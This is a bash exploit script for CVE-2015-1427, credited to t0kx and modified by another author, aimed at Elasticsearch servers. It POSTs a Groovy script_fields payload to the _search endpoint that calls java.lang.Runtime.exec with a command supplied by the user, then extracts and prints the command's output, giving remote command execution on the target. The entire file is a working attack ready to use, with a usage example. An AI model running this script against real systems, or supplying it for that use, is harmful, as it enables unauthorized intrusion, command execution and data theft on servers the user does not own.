#!/usr/bin/env bash
# CVE-2015-1427 exploit by t0kx
# https://github.com/t0kx/exploit-CVE-2015-1427
# Modified by George02 to have more control over curl command
# You can call this script like this: ./exploit.sh 127.0.0.1:9200 whoami

exploit() {
	printf "[+] Exploiting %s\n" ${HOST}
	printf "[+] Trigger Payload...\n"

	CURL_DATA=$(cat <<-EOF
			{
				"script_fields": {
					"myscript": {
						"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"$2\").getText()"
					}
				}
			}
		EOF
	)

	printf "[+] Running $2: %s\n"

	CURL_RESULT=$(curl -s http://${HOST}/_search\?pretty -XPOST -d "$CURL_DATA")
	PAYLOAD=$(echo "$CURL_RESULT" | grep "myscript" | awk -F '\\[ "' '{print substr($2, 1, length($2)-3)}' | sed 's/\\n/\'$'\n''/g')

	if [[ -z "$PAYLOAD" ]]; then
		printf "[ERR] PAYLOAD does not have myscript field\n"
		echo "[Q] Do you want to see the actual curl response?"
		select yn in "Sure" "No"; do
			case $yn in
				Sure ) printf "%s\n" "$CURL_RESULT"; break;;
				No ) exit;;
			esac
		done
	else
		printf ">> %s\n" ${PAYLOAD}
	fi

	printf "[+] Done\n"
}

main() {
	printf "[+] CVE-2015-1427 exploit by t0kx\n"

	if [ -z "${1}"  ]; then
		echo "[-] Please inform an host as parameter\n"
		exit -1
	else
		HOST=${1}
	fi

	exploit ${HOST} "$2"
}; main ${1} "$2"
